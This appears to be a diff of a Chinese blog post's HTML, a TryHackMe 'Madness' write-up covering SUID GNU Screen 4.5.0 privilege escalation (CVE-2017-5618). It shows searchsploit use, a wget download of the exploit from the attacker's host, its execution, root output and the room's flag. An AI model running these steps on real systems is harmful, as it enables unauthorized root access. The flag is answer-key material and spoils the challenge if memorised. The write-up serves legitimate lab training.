+<p><code>searchsploit</code> 搜索相关漏洞，并将 <code>41154.sh</code> 复制下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
 
-joker@ubuntu:~$ chmod +x linpeas.sh 
-joker@ubuntu:~$ .&#x2F;linpeas.sh <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                   |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation                                                    | linux/local/41154.sh</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                              | linux/local/41152.txt</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
 
-<p>把结果交给 ai 分析</p>
-<p><code>Screen 4.5.0</code> 版本存在一个著名的漏洞<code>CVE-2017-5618</code>，当配合 <code>SUID</code> 位时，可以用来读取任意文件或提权。</p>
-<pre class="line-numbers language-none"><code class="language-none">╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
-╚ https:&#x2F;&#x2F;book.hacktricks.wiki&#x2F;en&#x2F;linux-hardening&#x2F;privilege-escalation&#x2F;index.html#sudo-and-suid                                    
--rwsr-xr-x 1 root root 1.6M Jan  4  2020 &#x2F;bin&#x2F;screen-4.5.0 (Unknown SUID binary!)
--rwsr-xr-x 1 root root 1.6M Jan  4  2020 &#x2F;bin&#x2F;screen-4.5.0.old (Unknown SUID binary!)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code>searchsploit </code>搜索相关漏洞，并将 <code>41154.sh</code> 复制下来</p>
-<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
-└─# searchsploit  screen 4.5.0
-------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                   |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
-GNU Screen 4.5.0 - Local Privilege Escalation                                                    | linux&#x2F;local&#x2F;41154.sh
-GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                              | linux&#x2F;local&#x2F;41152.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-
-┌──(root㉿kali)-[~&#x2F;桌面]
-└─# cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41154.sh exp.sh <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/41154.sh exp.sh </span><br></pre></td></tr></table></figure>
 
 <p>再次利用 <code>wget</code> 将本地 <code>exp.sh</code> 上传并赋予权限</p>
-<pre class="line-numbers language-none"><code class="language-none">joker@ubuntu:&#x2F;tmp$ wget 192.168.140.133:2518&#x2F;exp.sh
---2026-05-13 06:57:27--  http:&#x2F;&#x2F;192.168.140.133:2518&#x2F;exp.sh
-Connecting to 192.168.140.133:2518... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 1149 (1.1K) [application&#x2F;x-sh]
-Saving to: ‘exp.sh’
-
-exp.sh                           100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]   1.12K  --.-KB&#x2F;s    in 0s      
-
-2026-05-13 06:57:29 (2.87 MB&#x2F;s) - ‘exp.sh’ saved [1149&#x2F;1149]
-
-joker@ubuntu:&#x2F;tmp$ chmod +x exp.sh
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">joker@ubuntu:/tmp$ wget 192.168.140.133:2518/exp.sh</span><br><span class="line">joker@ubuntu:/tmp$ <span class="built_in">chmod</span> +x exp.sh</span><br></pre></td></tr></table></figure>
 
 <p>运行后直接得到 <code>root</code> 权限</p>
-<pre class="line-numbers language-none"><code class="language-none">joker@ubuntu:&#x2F;tmp$ .&#x2F;exp.sh
-~ gnu&#x2F;screenroot ~
-[+] First, we create our shell and library...
-&#x2F;usr&#x2F;bin&#x2F;ld: cannot open output file &#x2F;tmp&#x2F;rootshell: Permission denied
-collect2: error: ld returned 1 exit status
-[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...
-[+] Triggering...
-&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
-[+] done!
-There is a screen on:
-        17252.pts-0.ubuntu      (Detached)
-1 Socket in &#x2F;tmp&#x2F;screens&#x2F;S-joker.
-# id  
-uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1000(joker)
-# cat &#x2F;root&#x2F;root.txt
-THM&#123;5ecd98aa66a6abb670184d7547c8124a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">joker@ubuntu:/tmp$ ./exp.sh</span><br><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line">[+] <span class="keyword">done</span>!</span><br><span class="line"><span class="comment"># id  </span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1000(joker)</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">THM&#123;5ecd98aa66a6abb670184d7547c8124a&#125;</span><br></pre></td></tr></table></figure>
 
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Madness.html">https://x9wd09ncc.github.io/post/TryHackMe_Madness.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/suid/">SUID</a><a class="post-meta__tags" href="/tags/screen/">Screen</a><a class="post-meta__tags" href="/tags/cve-2017-5618/">CVE-2017-5618</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Thompson.html" title="TryHackMe_Thompson"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Thompson</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHcakMe_Tony_the_Tiger.html" title="TryHackMe_Tony the Tiger"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Tony the Tiger</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_tomghost"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_tomghost</div></div></a></div><div><a href="/post/TruHackMe_Valley.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div><div><a href="/post/TryHackMe-CyberHeroes.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent T</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Buleprint</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>文件头修复</li>
+<li>隐写术：steghide</li>
+<li>ROT13 编码</li>
+<li>Screen 4.5.0 SUID 提权（CVE-2017-5618）</li>
+</ul>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5618">CVE-2017-5618: GNU Screen Privilege Escalation</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Madness.html">https://x9wd09ncc.github.io/post/TryHackMe_Madness.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/screen/">Screen</a><a class="post-meta__tags" href="/tags/cve-2017-5618/">CVE-2017-5618</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Thompson.html" title="TryHackMe_Thompson"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Thompson</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Tony_the_Tiger.html" title="TryHackMe_Tony_the_Tiger"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Tony_the_Tiger</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Blueprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Blueprint</div></div></a></div><div><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break_Out_The_Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-16</div><div class="title">TryHackMe_Break_Out_The_Cage</div></div></a></div><div><a href="/post/TryHackMe_Bounty_Hacker.html" title="TryHackMe_Bounty_Hacker"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Bounty_Hacker</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Madness"><span class="toc-number">1.</span> <span class="toc-text">Madness</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">页面分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.2.1.</span> <span class="toc-text">文件头修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">隐藏目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E5%86%99%E6%9C%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">隐写术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROT13-%E8%A7%A3%E7%A0%81"><span class="toc-number">1.2.4.</span> <span class="toc-text">ROT13 解码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Screen-SUID-%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">Screen SUID 提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.4.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
